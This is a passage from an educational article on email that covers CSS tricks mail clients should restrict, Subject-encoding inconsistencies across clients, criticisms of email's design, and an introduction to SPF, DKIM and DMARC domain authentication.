          <td><code>transparent</code>, <code>rgba(0,0,0,0)</code>, <code>hsla(0,0%,0%,0)</code> (for all <abbr title="Red, Green, Blue (color model)">RGB</abbr> and <abbr title="Hue, Saturation, and Lightness (color model)">HSL</abbr> values)</td>
        </tr>
        <tr>
          <td><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/background"><code>background</code></a>[<a href="https://developer.mozilla.org/en-US/docs/Web/CSS/background-color"><code>-color</code></a>]</td>
          <td>(when used to match the color of the text)</td>
        </tr>
        <tr>
          <td><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/opacity"><code>opacity</code></a></td>
          <td><code>0</code></td>
        </tr>
        <tr>
          <td><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/filter"><code>filter</code></a></td>
          <td><code>opacity(0)</code>, <code>opacity(0%)</code>, or <code>brightness(100)</code></td>
        </tr>
        <tr>
          <td><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/clip"><code>clip</code></a>[<a href="https://developer.mozilla.org/en-US/docs/Web/CSS/clip-path"><code>-path</code></a>]</td>
          <td><code>circle(0)</code> (and other shapes that don’t overlap the content)</td>
        </tr>
        <tr>
          <td><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/margin"><code>margin</code></a></td>
          <td><code>0 0 0 -1000px</code> (also for the individual side properties)</td>
        </tr>
        <tr>
          <td><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/position"><code>position</code></a></td>
          <td><code>absolute</code> or <code>relative</code> with <code>left: -1000px</code></td>
        </tr>
        <tr>
          <td><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/transform"><code>transform</code></a></td>
          <td><code>translateX(-1000px)</code> or <code>scale(0)</code></td>
        </tr>
        <tr>
          <td>[<a href="https://developer.mozilla.org/en-US/docs/Web/CSS/text-overflow"><code>text-</code></a>]<a href="https://developer.mozilla.org/en-US/docs/Web/CSS/overflow"><code>overflow</code></a></td>
          <td><code>hidden</code> (combined with [<code>max-</code>]<code>width</code> or [<code>max-</code>]<code>height</code>)</td>
        </tr>
      </tbody>
    </table>

    <figcaption>

The many ways to hide text and images with <abbr title="Cascading Style Sheets">CSS</abbr>.
If you can think of another way, <a href="mailto:contact@ef1p.com">let me know</a>.

</figcaption>
  </figure>

  <p>For some of the properties, such as <code>font-size</code> and <code>opacity</code>,
mail clients should enforce a minimum value.
For other properties, such as <code>display</code>, only certain values should be allowed.
Many of the properties can be removed completely.
For example, <a href="https://developers.google.com/gmail/design/reference/supported_css">Gmail doesn’t support</a>
<code>visibility</code>, <code>filter</code>, <code>clip</code>[<code>-path</code>], <code>position</code>, and <code>transform</code> at all.
Interestingly, the [<code>text-</code>]<code>overflow</code> property can be used to hide content based on the screen size of the client
even if only inline styles are allowed.
In order to make a static analysis even possible,
all <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Functions"><abbr title="Cascading Style Sheets">CSS</abbr> functions</a>,
such as <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/calc()"><code>calc()</code></a>, should be removed.
Otherwise, an attacker can simply replace <code>opacity: 0</code> with <code>opacity: calc(1 - 1)</code>.</p>

</details>

<h3 id="complexity">Complexity</h3>

<p>Since you made it to this paragraph, I probably don’t need to convince you that email is incredibly complex.
Email is a system that has been retrofitted to modern requirements for 40 years.
It’s no wonder then that what we have today is a complicated patchwork of extensions.
Just to be clear: I don’t want to criticize anyone in this section.
Most of the design decisions that led us to the current situation were reasonable at the time.
I still think it’s a good idea to assess what brought us here
as this allows us to appreciate what we have now.
In my view, the following limitations of early email are responsible for most of today’s complexity:</p>
<ul>
  <li><a href="https://evalapply.org/internet/#text-based-protocols"><strong>Text-based protocols</strong></a>:
Using characters to delimit the various parts of protocols and messages
makes it easy for us to interact with servers manually,
but it also prevents us from sending arbitrary content without escaping it first.
<a href="#simple-mail-transfer-protocol"><abbr title="Simple Mail Transfer Protocol">SMTP</abbr></a> and <a href="#post-office-protocol-version-3"><abbr title="Post Office Protocol version 3">POP3</abbr></a>
require <a href="#message-termination">periods to be escaped</a>,
<a href="#internet-message-access-protocol"><abbr title="Internet Message Access Protocol">IMAP</abbr></a>, <a href="#mail-filtering-language">Sieve</a>,
and <a href="#filter-management-protocol">ManageSieve</a> require user-provided arguments to be escaped,
and <a href="#multipart-messages">multipart messages</a> require <a href="#boundary-delimiter">unique boundaries</a>.
None of this is tragic but conversions are always a potential source of errors and incompatibilities.</li>
  <li><a href="#line-length-limit"><strong>Line-length limit</strong></a>:
Since each line of a message may consist of at most 1’000 characters,
<a href="https://datatracker.ietf.org/doc/html/rfc5322#section-3.2.2">folding whitespace</a>
is required for <a href="#header-fields-and-body">header fields</a>,
long text lines have to be <a href="#soft-line-breaks">broken</a>
without conflicting with <a href="#quoting-the-previous-message">quoting conventions</a>,
and system-specific <a href="#newline-characters">newline characters</a> must be converted to <code>{CR}{LF}</code>.</li>
  <li><a href="https://evalapply.org/internet/#text-encoding"><strong><abbr title="American Standard Code for Information Interchange">ASCII</abbr>-only characters</strong></a>:
Email is older than <a href="https://en.wikipedia.org/wiki/ISO/IEC_8859">ISO 8859</a>
and <a href="https://en.wikipedia.org/wiki/Unicode">Unicode</a>.
To remain backward compatible,
non-<abbr title="American Standard Code for Information Interchange">ASCII</abbr> characters have to be encoded in the <a href="#content-encoding">message body</a>,
in <a href="#header-encoding">header fields</a>, in <a href="#internationalized-domain-names">domain names</a>,
in <a href="#internationalized-parameter-values">parameter values</a>, and in <a href="#percent-encoding"><abbr title="Uniform Resource Locators (the formal name for web addresses)">URLs</abbr></a>.
To make things even more complicated, all these encodings are different.
When the involved servers <a href="#common-smtp-extensions">support <code>SMTPUTF8</code></a>,
<abbr title="Unicode Transformation Format">UTF</abbr>-8 can be used in the <a href="#email-address-internationalization">local part</a> of an email address,
but internationalized messages have to be <a href="#email-address-internationalization">downgraded</a>
for clients which don’t support <abbr title="Unicode Transformation Format">UTF</abbr>-8.</li>
  <li><strong>No</strong> <a href="#submission-versus-relay"><strong>submission protocol</strong></a>:
In the early years of email, mail clients could submit
outgoing messages to any mail server without authentication.
As a consequence, mail submission and mail retrieval were handled completely differently.
In order to make the change for existing mail clients as small as possible,
the mail submission protocol was forked from <a href="#extended-simple-mail-transfer-protocol"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr></a>
rather than being incorporated into <a href="#access-protocols">access protocols</a>,
such as <a href="#post-office-protocol-version-3"><abbr title="Post Office Protocol version 3">POP3</abbr></a> and <a href="#internet-message-access-protocol"><abbr title="Internet Message Access Protocol">IMAP</abbr></a>.
Unless their mailbox provider is in a <a href="#configuration-database">configuration database</a>,
users have to <a href="#configuration">configure</a> both their
<a href="#incoming-mail-server">incoming mail server</a> and their
<a href="#outgoing-mail-server">outgoing mail server</a> to this day.
If they change their passwords, they usually have to enter it twice in their settings.
Furthermore, it can happen that they can receive messages but cannot send them and vice versa.
For ordinary users, this is really confusing.
The distinction between incoming mail server and outgoing mail server
is also the reason why <a href="#double-submission-problem">messages have to be submitted twice</a>
if you want to record the sent messages in your mailbox.
After two decades of little progress with regard to access protocols,
<a href="#json-meta-application-protocol"><abbr title="JSON Meta Application Protocol">JMAP</abbr></a> finally addresses this and many other issues.</li>
  <li><strong>No</strong> <a href="#use-of-tls"><strong>transport security</strong></a>:
Emails and account passwords couldn’t be secured in transit for more than a decade.
Once <a href="https://evalapply.org/internet/#transport-layer-security">Transport Layer Security (<abbr title="Transport Layer Security">TLS</abbr>)</a> became popular,
existing protocols were retrofitted so that all communication could be encrypted and authenticated.
All the protocols were extended to support <a href="#implicit-tls-versus-explicit-tls">Explicit <abbr title="Transport Layer Security">TLS</abbr></a>,
but all of them require <a href="#libressl-doesnt-support-managesieve">different commands</a> to activate <abbr title="Transport Layer Security">TLS</abbr>,
which makes it difficult to use some of them from the <a href="#command-line-interface">command line</a>.
The introduction of protocol variants which use <a href="#implicit-tls-versus-explicit-tls">Implicit <abbr title="Transport Layer Security">TLS</abbr></a>
required <a href="#port-numbers">additional port numbers</a>, which confuses ordinary users even more.
Since mail servers don’t know whether other mail servers support <abbr title="Transport Layer Security">TLS</abbr>, the communication between
them is still vulnerable to <a href="https://en.wikipedia.org/wiki/Downgrade_attack">downgrade attacks</a>.
I’ll cover in the <a href="#transport-security">last chapter</a> of this article how such attacks can be prevented.</li>
  <li><strong>No</strong> <a href="#domain-authentication"><strong>sender authentication</strong></a>:
Since emails aren’t authenticated, it’s quite easy to <a href="#spoofing">spoof the sender</a> of a message.
This aggravates problems such as <a href="#spam">spam</a> and <a href="#phishing">phishing</a>,
and it can lead to undesirable <a href="#backscatter">backscatter</a>.
I’ll explain the mechanisms which are used to alleviate this issue in the <a href="#domain-authentication">last chapter</a>.</li>
</ul>

<details>
  <summary id="benign-inconsistencies">
Benign inconsistencies
</summary>

  <p>As we have seen in the <a href="#security">previous section</a>, complexity is bad for security.
As we will see in the <a href="#innovation">next section</a>, complexity is also bad for innovation.
But for now, let’s have some fun with a few benign inconsistencies, which are caused by email’s complexity:</p>
  <ul>
    <li>
      <p>What should happen when a user enters a <code>Subject</code> which is already <a href="#header-encoding">Encoded-Word encoded</a>?
In my opinion, the recipient should see exactly what the sender entered.
In other words, <code>decode(encode(Subject)) = Subject</code> should always hold even if the <code>Subject</code> is already encoded.
(Note that <code>encode(decode(Encoded)) = Encoded</code> is not the case
for encodings in which more characters can be escaped than necessary.)
As far as I can tell, <a href="https://datatracker.ietf.org/doc/html/rfc2047"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2047</a> doesn’t specify
how mail clients should handle this.
It just says at <a href="https://datatracker.ietf.org/doc/html/rfc2047#page-8">the bottom of page 8</a>:
“In rare cases it may be necessary to encode ordinary text that looks like an Encoded-Word.”
When you paste <code>=?ISO-8859-1?Q?=A1Buenos_d=EDas!?=</code>,
which is the Encoded-Word encoding of <code>¡Buenos días!</code>, into the <code>Subject</code> field of various mail clients,
they send the following <code>Subject</code> header field:</p>

      <figure>

        <table>
          <thead>
            <tr>
              <th>Mail client</th>
              <th>Subject encoding</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td>Apple Mail</td>
              <td><code>=?us-ascii?B?PT9JU08tODg1OS0xP1E/PUExQnVlbm9zX2Q9RURhcyE/PQ==?=</code></td>
            </tr>
            <tr>
              <td>Thunderbird</td>
              <td><code>=?UTF-8?B?wqFCdWVub3MgZMOtYXMh?=</code></td>
            </tr>
            <tr>
              <td>Gmail</td>
              <td><code>=?UTF-8?B?wqFCdWVub3MgZMOtYXMh?=</code></td>
            </tr>
            <tr>
              <td>Outlook.com</td>
              <td><code>=?iso-8859-1?Q?=A1Buenos_d=EDas!?=</code></td>
            </tr>
            <tr>
              <td>Yahoo! Mail</td>
              <td><code>=?ISO-8859-1?Q?=A1Buenos_d=EDas!?=</code></td>
            </tr>
          </tbody>
        </table>

        <figcaption>

How various mail clients encode the subject <code>=?ISO-8859-1?Q?=A1Buenos_d=EDas!?=</code>.

</figcaption>
      </figure>

      <p>Only Apple Mail produces an encoding in which the recipient sees what the sender entered.
Thunderbird and Gmail recognize that the user entered an Encoded-Word,
but instead of escaping it, they decode and re-encode the user-provided string.
Outlook.com also recognizes that the user entered an Encoded-Word
but then only lowercases the <a href="#character-encoding">character set</a>. 🤷‍♂️</p>
    </li>
    <li>What the standard <a href="https://datatracker.ietf.org/doc/html/rfc2047#section-7">does say</a>
is that compliant mail clients must ensure that all words
which begin with <code>=?</code> and end with <code>?=</code> are valid Encoded-Words.
So what happens if you enter <code>=?Hello?=</code> in the subject line?
Only Apple Mail encodes this as <code>=?us-ascii?B?PT9IZWxsbz89?=</code>.
Thunderbird, Gmail, Outlook.com, and Yahoo Mail leave the string as is
and thus don’t conform to <a href="https://datatracker.ietf.org/doc/html/rfc2047"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2047</a>.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc5322#section-3.2.2"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5322</a> states that
runs of whitespace are to be interpreted as a single space character in structured header fields.
The <a href="https://datatracker.ietf.org/doc/html/rfc5322#section-3.6.5"><code>Subject</code></a>, however, is an unstructured header field,
where only <a href="#newline-characters">newline characters</a> which are followed by whitespace
<a href="https://datatracker.ietf.org/doc/html/rfc5322#section-2.2.3">are to be removed</a>.
Gmail, Outlook.com, and Yahoo Mail display adjacent spaces in the <code>Subject</code> as a single space.
Thunderbird is a bit of a special case: It displays adjacent spaces in the list view
but not in the detail view of a single message.
Consistency is not even achieved within the same mail client.
Once more, only Apple Mail conforms to the standard.</li>
  </ul>

  <p>If you’re aware of other inconsistencies, <a href="mailto:contact@ef1pcom">let me know</a>.</p>

</details>

<details>
  <summary id="unreasonable-decisions">
Unreasonable decisions
</summary>

  <p>I wrote <a href="#complexity">above</a> that most of the design decisions
which led us to the current situation were reasonable at the time.
As you might have noticed, “most” is not “all”.
So here comes the list of things which should never have been approved or implemented:</p>
  <ul>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc5322#section-3.2.2"><strong>Comments in header fields</strong></a>:
Comments can appear almost anywhere in structured header fields.
Comments are wrapped in parentheses and comments can be nested.
It should have been clear from the very beginning that users won’t compose and parse
<a href="https://datatracker.ietf.org/doc/html/rfc5322"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5322</a> messages themselves.
Since emails are almost always parsed by mail clients, which ignore any comments,
comments increase the complexity of the <a href="#format">message format</a> without bringing any benefits.
Where comments do have some merit, such as in the <a href="#trace-information"><code>Received</code> header field</a>,
an extensible list of name-value pairs similar to the parameters in <a href="#content-type"><abbr title="Multipurpose Internet Mail Extensions">MIME</abbr> header fields</a>
could have been used instead.
You find an example message with plenty of comments in
<a href="https://datatracker.ietf.org/doc/html/rfc5322#appendix-A.5">Appendix A.5 of <abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5322</a>.
(The example violates a <a href="https://datatracker.ietf.org/doc/html/rfc2119#section-4"><code>SHOULD NOT</code></a>
<a href="https://www.rfc-editor.org/errata/eid2515">two</a> <a href="https://www.rfc-editor.org/errata/eid2579">times</a>, though.)</li>
    <li><a href="#address-syntax"><strong>Address syntax</strong></a>:
Determining whether an email address is valid or whether two addresses are the same should be easy.
I think I have a good understanding of the former question
but I <a href="#address-syntax">still struggle</a> with the latter.
Given that arbitrary strings can be encoded with only letters and digits if needed,
the syntax of email addresses should never have been so complicated.
I believe it’s a perfect example of where less would have been more.</li>
    <li><a href="#bcc-removal"><strong>Vague Bcc semantics</strong></a>:
<a href="https://datatracker.ietf.org/doc/html/rfc5322#section-3.6.3"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5322</a> requires only
that <code>Bcc</code> recipients are never disclosed to non-<code>Bcc</code> recipients.
Within this constraint, implementations can do pretty much anything they want.
In my opinion, user-facing behavior should be fully specified
because users cannot be expected to study how a particular email setup behaves.</li>
    <li><a href="#content-encoding"><strong><abbr title="Multipurpose Internet Mail Extensions">MIME</abbr> version</strong></a>:
The <code>MIME-Version: 1.0</code> header field is pointless, which is also acknowledged by
<a href="https://www.networkworld.com/article/2199390/the-mime-guys--how-two-internet-gurus-changed-e-mail-forever.html">the author himself</a>.</li>
    <li><a href="#html-emails"><strong><abbr title="HyperText Markup Language">HTML</abbr> emails</strong></a>:
In my opinion, <abbr title="HyperText Markup Language">HTML</abbr> emails were introduced prematurely
without thinking through the <a href="#different-appearances">implications</a> first.
At the very least, a subset of <abbr title="HyperText Markup Language">HTML</abbr> and <abbr title="Cascading Style Sheets">CSS</abbr> should have been standardized,
which all compliant mail clients have to support.
If this was the case, we might have a flag to disable <a href="#hide-content-with-css">undesirable <abbr title="Cascading Style Sheets">CSS</abbr> properties</a>
directly in the <a href="https://en.wikipedia.org/wiki/Browser_engine">rendering engine</a> by now.
Additionally, such an effort would likely also have led
to a reasonable way to <a href="#quoting-html-messages">scope <abbr title="Cascading Style Sheets">CSS</abbr></a>.</li>
    <li><a href="#remote-content"><strong>Remote content</strong></a>:
Mail clients should never have supported remote content
as it violates fundamental principles of email.</li>
    <li><a href="#address-resolution"><strong>Domain lookup</strong></a>:
Falling back to <code>A</code> and <code>AAAA</code> records if a recipient domain has no <code>MX</code> records
causes <a href="#null-mx-record">problems</a> without bringing any substantial benefits.</li>
    <li><a href="#header-fields-and-body"><strong>Flat email header</strong></a>:
Header fields are added by different <a href="#entities">entities</a>,
which is not reflected in the flat structure of header fields.
This is not ideal for <a href="#dkim-signature-header-field"><abbr title="DomainKeys Identified Mail">DKIM</abbr> signatures</a>
and for header fields which convey information from the incoming mail server to the mail clients of the recipient.
Mail clients can rely on such header fields only if they know
that the incoming mail server removes these header fields from incoming messages.
Otherwise, a malicious sender can mislead the mail clients of the recipient.
Examples of such header fields are <a href="#authentication-results-header-field"><code>Authentication-Results</code></a>,
<a href="#bimi-header-fields"><code>BIMI-Location</code></a>, and <a href="#bimi-header-fields"><code>BIMI-Indicator</code></a>.</li>
  </ul>

  <p>If you want to have something added to or removed from this list, <a href="mailto:contact@ef1p.com">let me know</a>.</p>

</details>

<h3 id="innovation">Innovation</h3>

<p>Besides <a href="#json-meta-application-protocol"><abbr title="JSON Meta Application Protocol">JMAP</abbr></a>, <a href="#dynamic-content">dynamic content</a>,
and what we’ll discuss in the <a href="#fixes">last chapter</a>,
there was barely any innovation over the last two decades.
This is a pity given that email is the only decentralized communication service with global adoption.
I can only speculate about the reasons for the lack of innovation:</p>
<ul>
  <li><strong>Complexity</strong>: The enormous complexity of email can deter software engineers from entering the field.
Patching a heavily patched system further is also not appealing to many young talents.
I hope this article can motivate more people to shape the future of email in a positive way.</li>
  <li><strong>Fragmentation</strong>: The email ecosystem is so fragmented that
no single organization can push the industry forward.
The innovation that we see, such as <a href="#email-markup">email markup</a> and <a href="#dynamic-content">dynamic content</a>,
often remains limited to just a few companies.
If you want to write a mail client for a general audience,
you have to support <a href="#internet-message-access-protocol"><abbr title="Internet Message Access Protocol">IMAP</abbr></a>.
If you have to deal with the intricacies of <abbr title="Internet Message Access Protocol">IMAP</abbr> anyway,
you don’t gain anything by implementing a newer <a href="#access-protocols">access protocol</a>
such as <a href="#json-meta-application-protocol"><abbr title="JSON Meta Application Protocol">JMAP</abbr></a> as well.
As long as all mail clients which people want to use support <abbr title="Internet Message Access Protocol">IMAP</abbr>,
existing mailbox providers have little incentive to support <abbr title="JSON Meta Application Protocol">JMAP</abbr>.</li>
  <li><strong>Saturation</strong>: The email market is saturated with free solutions for clients, servers, and hosting.
The low willingness to pay for a product or service
makes it really hard to build an innovative business in this space.
Combined with the inertia of users, there is almost no economic pressure to innovate.
Mailbox providers with a strong focus on privacy are the only exception to this rule because
more and more people realize that if they don’t pay for a service, they’re the product and not the customer.</li>
</ul>

<h4 id="format-innovation">Format innovation</h4>

<p>Since <a href="https://en.wikipedia.org/wiki/Skype">Skype</a> failed to innovate,
it was superseded by <a href="https://en.wikipedia.org/wiki/Zoom_(software)">Zoom</a> and other applications.
<a href="https://en.wikipedia.org/wiki/WhatsApp">WhatsApp</a> might share a similar fate:
<a href="https://en.wikipedia.org/wiki/Telegram_(software)">Telegram</a> is showing us
how much <a href="https://telegram.org/blog/6-years">room for innovation</a> there is for a messaging app.
There’s plenty of features I would like to see in email.
For a start, we still have no <a href="#no-reply"><code>No-Reply</code> header field</a>,
no <a href="#challenges"><code>Proof-Of-Work</code> header field</a>,
no header field to <a href="#different-appearances">reference the previous message</a>
by its <a href="#cryptographic-hash-functions">hash</a>
(ideally using a <a href="#applications-of-cryptographic-hash-functions">hash tree</a> for <abbr title="Multipurpose Internet Mail Extensions">MIME</abbr> parts
so that attachments can be removed from a message without invalidating its hash),
no header fields for the sender’s contact details
to replace <a href="https://en.wikipedia.org/wiki/Signature_block">email signatures</a>,
no <a href="#content-type">content type</a> to initiate and reply to surveys, etc.</p>

<p>Some features, such as <a href="#message-compression">message compression</a>, exist in theory but not in practice.
Other features, which originated in the alternative email system <a href="https://en.wikipedia.org/wiki/X.400">X.400</a>,
were formally specified as <abbr title="Internet Engineering Task Force">IETF</abbr> email header fields in order to increase compatibility between the two systems
but were never recommended for general use.
Among these header fields are <a href="https://datatracker.ietf.org/doc/html/rfc4021#section-2.1.46"><code>Supersedes</code></a>
to replace a sent message with a revised version,
<a href="https://datatracker.ietf.org/doc/html/rfc4021#section-2.1.50"><code>Expires</code></a> to indicate when a message loses its validity,
and <a href="https://datatracker.ietf.org/doc/html/rfc4021#section-2.1.51"><code>Reply-By</code></a> to request a response in the specified time period.</p>

<h4 id="client-innovation">Client innovation</h4>

<p>Given the decentralized nature of email, protocol and format innovations are difficult to achieve.
However, nothing hinders mail clients from innovating at the edge of the network.
I’ve mentioned plenty of ideas throughout this article.
Among them are <a href="#spam">sender approval</a>, <a href="#challenges">automatic challenges</a>,
<a href="#bcc-recovery"><code>Bcc</code> recovery</a>, <a href="#privacy">privacy features</a> such as
<a href="#proxying-remote-content">proxying remote content</a> via <a href="https://en.wikipedia.org/wiki/Tor_(anonymity_network)">Tor</a>
(and even submitting emails via Tor as long as mailbox providers leak the <abbr title="Internet Protocol">IP</abbr> addresses of their users),
and <a href="#security">security features</a> such as preventing <a href="#malicious-display-names">malicious display names</a>
and <a href="#different-appearances">different appearances</a> of messages.
It would be great if my mail client displayed whether a received message was successfully
authenticated with <a href="#sender-policy-framework"><abbr title="Sender Policy Framework">SPF</abbr></a> and <a href="#domainkeys-identified-mail"><abbr title="DomainKeys Identified Mail">DKIM</abbr></a>
(just <a href="#confidentiality-and-integrity">like Gmail</a>).
I would like to see native support for <a href="#autoconfiguration"><abbr title="Domain Name System">DNS</abbr>-based autoconfiguration</a>,
<a href="#mail-filtering-language">Sieve</a> and <a href="#filter-management-protocol">ManageSieve</a>,
as well as <a href="#comparison-of-smime-and-pgp"><abbr title="Pretty Good Privacy">PGP</abbr></a>.
I don’t understand why mail clients separate the outbox from the inbox.
(I don’t know any other messaging app which does this,
and just because <a href="#internet-message-access-protocol"><abbr title="Internet Message Access Protocol">IMAP</abbr></a> uses folders doesn’t mean you have to display them.)
I think it would be great if my mail client could
<a href="https://opentimestamps.org/">timestamp</a> all the emails that I send.
Whenever I submit a responsible disclosure, I do this manually.</p>

<h2 id="fixes">Fixes</h2>

<p>The last chapter of this article is dedicated to more recent standards
which address some of the aforementioned <a href="#security">security issues</a>.
We’ll study how <a href="#spoofing">spoofing</a> is prevented with <a href="#domain-authentication">domain authentication</a>
and how <a href="#confidentiality-and-integrity">confidentiality and integrity</a> is ensured in the presence of an
<a href="#implicit-tls-versus-explicit-tls">active attacker</a> with <a href="#transport-security">strict transport security</a>.
Many of the approaches rely on the <a href="https://evalapply.org/internet/#domain-name-system">Domain Name System (<abbr title="Domain Name System">DNS</abbr>)</a>
to provide additional information.
This is secure only if the records are authenticated with
<a href="https://evalapply.org/internet/#domain-name-system-security-extensions"><abbr title="Domain Name System Security Extensions">DNSSEC</abbr></a>.
I will no longer mention this aspect in the remaining subsections.
Some of the steps have to be performed by the owner of the domain rather than the mailbox provider.
If you use a custom domain for your emails, you should definitely read the part about
<a href="#domain-authentication">domain authentication</a> to make sure that your domain is configured properly.
Since email is a decentralized service, we can improve its security only in a collective effort.</p>

<h3 id="domain-authentication">Domain authentication</h3>

<p>Historically, the sender of an email was not authenticated.
Anyone could <a href="#submission-versus-relay">relay a message</a> to anyone
using any <a href="#sender"><code>From</code> address</a> they wanted.
Impersonating another sender is known as <a href="#spoofing">spoofing</a>.
While the prevention of spoofing won’t eliminate <a href="#spam">spam</a> and <a href="#phishing">phishing</a> on its own
because spammers can implement the following standards as well and phishing remains possible
with <a href="#homograph-attack">similar domains</a> and <a href="#malicious-display-names">malicious display names</a>,
it’s an important prerequisite for other techniques, such as <a href="#spam">flagging unknown senders</a>.
As we saw <a href="#why-outgoing-mail-servers">earlier</a>,
<a href="https://en.wikipedia.org/wiki/Email_spoofing">email spoofing</a> is addressed in two steps:
The incoming mail server of the recipient verifies
that the other party is authorized to send emails on behalf of the sender’s domain,
and the outgoing mail server of this domain ensures that the local part of the <code>From</code> address
belongs to the user who submitted the message.</p>

<figure>
  <svg id="figure-simplified-architecture-authentication" data-name="simplified-architecture-authentication" width="599.148" height="298.25" viewBox="-131.662 -5 599.148 298.25" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <path d="M -77.706,83.813 A 76.456 166.438 0 0 0 -1.25,250.25 L -1.24009,250.251342" marker-end="url(#arrow-gray)" stroke-dasharray="190"></path>
    <text text-anchor="end">
        <tspan x="-60.322" y="223.906">User</tspan><tspan x="-60.322" y="245.906">authen-</tspan><tspan x="-60.322" y="267.906">tication</tspan>
    </text>
    <line x1="283.118" y1="83.813" x2="283.118" y2="207.25" marker-end="url(#arrow)" stroke-dasharray="116"></line>
    <text text-anchor="start">
        <tspan x="295.118" y="129.9">User</tspan><tspan x="295.118" y="151.9">authen-</tspan><tspan x="295.118" y="173.9">tication</tspan>
    </text>
    <line x1="230.1" y1="41.75" x2="106.662" y2="41.75" marker-end="url(#arrow-green)" stroke-dasharray="116"></line>
    <text text-anchor="middle">
        <tspan x="167.912" y="7.75">Domain</tspan><tspan x="167.912" y="29.75">authentication</tspan>
    </text>
    <line x1="52.706" y1="83.813" x2="52.706" y2="207.25" marker-end="url(#arrow-green)" stroke-dasharray="116"></line>
    <text text-anchor="end">
        <tspan x="40.706" y="129.9">User</tspan><tspan x="40.706" y="151.9">authen-</tspan><tspan x="40.706" y="173.9">tication</tspan>
    </text>
    <rect x="0" y="208.5" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="52.706" y="245.15"><tspan>Mail client</tspan></tspan><tspan x="52.706" y="267.15">of sender</tspan>
    </text>
    <rect x="0" y="0" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="52.706" y="25.65"><tspan>Outgoing</tspan></tspan><tspan x="52.706" y="47.65"><tspan>mail server</tspan></tspan><tspan x="52.706" y="69.65">of sender</tspan>
    </text>
    <rect x="230.412" y="0" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="283.118" y="25.65"><tspan>Incoming</tspan></tspan><tspan x="283.118" y="47.65"><tspan>mail server</tspan></tspan><tspan x="283.118" y="69.65">of recipient</tspan>
    </text>
    <rect x="230.412" y="208.5" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="283.118" y="245.15"><tspan>Mail client</tspan></tspan><tspan x="283.118" y="267.15">of recipient</tspan>
    </text>
    <rect x="-130.412" y="0" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="-77.706" y="25.65"><tspan>Incoming</tspan></tspan><tspan x="-77.706" y="47.65"><tspan>mail server</tspan></tspan><tspan x="-77.706" y="69.65">of sender</tspan>
    </text>
    <rect x="360.824" y="0" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="413.53" y="25.65"><tspan>Outgoing</tspan></tspan><tspan x="413.53" y="47.65"><tspan>mail server</tspan></tspan><tspan x="413.53" y="69.65">of recipient</tspan>
    </text>

</svg>

  <figcaption>
The incoming mail server of the recipient authenticates the outgoing mail server of the sender
and the outgoing mail server of the sender authenticates the user who submits the message.
</figcaption>
</figure>

<p>As the title suggests, this subsection covers only the first part of the problem, namely
how a domain owner can specify which mail servers are authorized to send messages on behalf of the domain and
how receiving mail servers can verify whether the sending mail server is indeed authorized for the claimed domain.
The second part is usually solved with
<a href="#password-based-authentication-mechanisms">password-based authentication mechanisms</a>.
The following techniques don’t prevent spoofing if the outgoing mail server of the sender is compromised
or if the attacker can create an account at the same mailbox provider
and <a href="#spoofed-sender-during-submission">impersonate another user during submission</a>.</p>

<p>Before you continue, make sure that you understand the difference between
<a href="#message-versus-envelope">a message and its envelope</a>.</p>

<p>There are three complementary standards for domain authentication:</p>
<ul>
  <li><a href="#sender-policy-framework"><strong>Sender Policy Framework (<abbr title="Sender Policy Framework">SPF</abbr>)</strong></a>:
List the <a href="https://evalapply.org/internet/#network-layer"><abbr title="Internet Protocol">IP</abbr> addresses</a> of your outgoing mail servers in a <abbr title="Domain Name System">DNS</abbr> record at your domain.
<abbr title="Sender Policy Framework">SPF</abbr> protects only the <code>MAIL</code> <code>FROM</code> address,
which is used for <a href="#bounce-messages">bounce messages</a>.
<abbr title="Sender Policy Framework">SPF</abbr> authentication fails when <a href="#email-forwarding">emails are forwarded</a>.</li>
  <li><a href="#domainkeys-identified-mail"><strong>DomainKeys Identified Mail (<abbr title="DomainKeys Identified Mail">DKIM</abbr>)</strong></a>:
Let the outgoing mail servers sign outgoing messages
and publish the <a href="https://evalapply.org/internet/#digital-signatures">public key</a> in a <abbr title="Domain Name System">DNS</abbr> record at the sender’s domain.
The signature usually survives email forwarding but introduces <a href="#non-repudiation">non-repudiation</a>.</li>
  <li><a href="#domain-based-message-authentication-reporting-and-conformance"><strong>Domain-based Message Authentication, Reporting, and Conformance (<abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr>)</strong></a>:
Publish a policy, which tells recipients what to do with messages
that fail both <abbr title="Sender Policy Framework">SPF</abbr> and <abbr title="DomainKeys Identified Mail">DKIM</abbr>, in a <abbr title="Domain Name System">DNS</abbr> record at your domain.
Without a <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> record, the recipient <a href="#author-domain-signing-practices">cannot know</a> whether the sender uses <abbr title="DomainKeys Identified Mail">DKIM</abbr>.
